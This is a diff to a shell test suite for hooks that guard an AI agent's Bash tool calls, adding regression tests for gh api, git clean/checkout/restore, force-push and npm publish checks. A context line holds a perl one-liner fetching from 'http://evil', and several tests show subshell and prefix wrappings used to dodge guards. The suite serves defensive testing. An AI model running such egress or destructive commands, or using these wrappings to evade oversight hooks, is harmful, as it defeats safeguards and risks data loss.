@@ -215,6 +215,12 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owne
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh -R owner/repo api /repos/o/r/issues -ftitle=x"}}'                 "blocks a gh api write behind a leading -R owner/repo (#284)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api graphql -f query=mutation{addComment(x:1){id}}"}}' "blocks a gh api graphql mutation behind a leading --repo (#284)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api graphql -f query=query{viewer{login}}"}}'    "allows a gh api graphql read query behind a leading --repo (#284)"
+# #282: gh api's own flags (e.g. --paginate, -H) can sit BEFORE the graphql endpoint positional,
+# so a fixed argv[2] == "graphql" read misses it and wrongly falls back to the generic
+# implicit-POST rule, over-blocking a legitimate read.
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api --paginate graphql -f query=query{viewer{login}}"}}'          "allows a gh api graphql read query behind a leading --paginate (#282)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api --paginate graphql -f query=mutation{addComment(x:1){id}}"}}' "still blocks a gh api graphql mutation behind a leading --paginate (#282)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api -H Accept:x graphql -f query=query{viewer{login}}"}}'         "allows a gh api graphql read query behind a leading separate-value -H (#282)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api /repos/o/r"}}'                              "allows a gh api read behind a leading --repo (#284)"
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
@@ -376,6 +382,9 @@ assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"sudo git checkout held\"}}"    "blocks a held checkout behind a sudo prefix (#193)"
 # shellcheck disable=SC2016
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo \$(git checkout held)\"}}" "blocks a held checkout hidden inside a \$(...) command substitution (#200)"
+# #290: a bare subshell's trailing ')' (glued to the last word, e.g. `held)`) must not ride along
+# into the checked-out branch name and break the exact-name match.
+assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"(git checkout held)\"}}" "blocks a held checkout wrapped in a bare subshell — trailing ')' must not corrupt the target name (#290)"
 assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
@@ -461,6 +470,17 @@ assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -nfd\"}}"              "allows clean when -n/--dry-run is set, even combined with force (#230)"
 rm -f "$dgrepo/u.txt"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -f\"}}"                "allows clean -f when there is nothing untracked to remove (#230)"
+# #290: a bare subshell's trailing ')' must not ride along as a bogus pathspec in the internal
+# `git clean -n` preview this predicate runs to decide whether anything would actually be removed.
+echo untracked > "$dgrepo/u.txt"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"(git clean -f)\"}}"              "blocks clean -f wrapped in a bare subshell — trailing ')' must not be read as the preview's pathspec (#290)"
+rm -f "$dgrepo/u.txt"
+# #258: git-clean's only short glued value flag, -e<pattern>, must reach the internal -n preview
+# verbatim — the 'f'-stripping trim meant for a boolean flag cluster must not also eat 'f' bytes
+# out of the pattern itself (`-e*.staff` -> corrupted `-e*.sta`, which stops excluding .staff files).
+touch "$dgrepo/a.staff" "$dgrepo/b.staff"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -f -e*.staff\"}}"      "allows clean -f -e*.staff when the exclude pattern covers everything untracked, glued value unmolested (#258)"
+rm -f "$dgrepo/a.staff" "$dgrepo/b.staff"
 
 # git branch -D
 git -C "$dgrepo" branch merged-branch
@@ -498,6 +518,10 @@ assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore --staged .\"}}"      "allows a --staged-only restore — working tree files are untouched (#230)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore -s HEAD .\"}}"        "blocks restore -s <tree> . (separate-token --source), not the staged toggle (#240)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore -S .\"}}"             "allows restore -S . (short --staged) — working tree files are untouched (#240)"
+# #290: a bare subshell's trailing ')' must not ride along after the '.' and break the
+# discard-everything exact-match check.
+echo y >> "$dgrepo/f.txt"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"(git checkout -- .)\"}}"          "blocks checkout -- . wrapped in a bare subshell — trailing ')' must not corrupt the '.' match (#290)"
 git -C "$dgrepo" checkout -q -- f.txt
 
 # git push -f / --force: needs a real remote to reason about fast-forward-ness.
@@ -531,6 +555,9 @@ assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a non-force push (#230)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch -ofield=1\"}}" "allows a non-force push with a glued push-option value containing an 'f' byte, not misread as -f (#246)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch -ofield=1\"}}" "still blocks a real force-push alongside a glued push-option value (#246)"
+# #290: a bare subshell's trailing ')' must not ride along into the positional argv and corrupt
+# the positional count `_push_force_hit` gates on.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"(cd $dgrepo && git push -f origin scratch)\"}}" "blocks a force-push that would discard commits, wrapped in a bare subshell (#290)"
 
 # #245: a bundled -fd (force+delete) must be recognized as an out-of-scope delete-push (a
 # different risk not handled by this fast-forward/ancestor check), not evaluated as an ordinary
@@ -583,6 +610,13 @@ assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --cache /
 assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --editor vim publish"}}'                                     "blocks npm publish behind a leading separate-value --editor (#287)"
 assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --cafile /tmp/ca.pem publish"}}'                             "blocks npm publish behind a leading separate-value --cafile (#287)"
 assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --color publish"}}'                                          "still correctly resolves the subcommand as publish, not --color's value — --color is deliberately left boolean-only since it can be either (#287)"
+
+# #289: the exact repro from the issue report — npm's leading global flags in their glued
+# `--flag=value` form. --loglevel and --tag were already in NPM_GLOBAL_VALUE_OPTS (added for
+# #284/#287) so this already worked, but was untested in exactly this glued shape; locking it in
+# with its own regression test so the issue closes on a resolving commit.
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --loglevel=silent publish"}}'                                "blocks npm publish behind a leading glued --loglevel= (#289)"
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --tag=beta publish"}}'                                       "blocks npm publish behind a leading glued --tag= (#289)"
 
 # git push straight to a GitHub-protected branch (#252) — gated on a real `gh api
 # repos/{owner}/{repo}/branches/<branch>/protection` check, not a branch-name guess. Stub `gh` on
